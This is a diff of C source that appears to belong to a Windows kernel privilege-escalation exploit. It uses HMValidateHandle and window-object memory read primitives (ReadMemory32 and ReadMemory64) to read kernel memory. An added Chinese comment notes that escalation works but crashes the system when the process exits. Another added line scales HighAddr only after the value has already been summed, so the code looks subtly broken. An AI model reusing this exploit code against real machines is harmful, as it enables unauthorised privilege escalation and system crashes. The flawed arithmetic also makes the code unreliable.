@@ -4,6 +4,7 @@
 #include <profileapi.h>
 typedef void*(NTAPI *lHMValidateHandle)(HWND h, int type);
 lHMValidateHandle pHmValidateHandle = NULL;
+//提权会成功但是进程退出会蓝屏 原因寻找中
 typedef struct _HEAD
 {
 	HANDLE h;
@@ -87,6 +88,7 @@ VOID ReadMemory64(HWND hManager, HWND Worker, DWORD64 addr, PVOID dst,DWORD64 le
 		 LowAddr = ReadMemory32(hManager, Worker, addr + 8);
 		 HighAddr = ReadMemory32(hManager, Worker, addr + 8 + sizeof(ULONG32));
 		 read = HighAddr + LowAddr;
+		  HighAddr *= 0x100000000;
 		 *(DWORD64*)((DWORD64)dst+8) = read;
 	}
 }
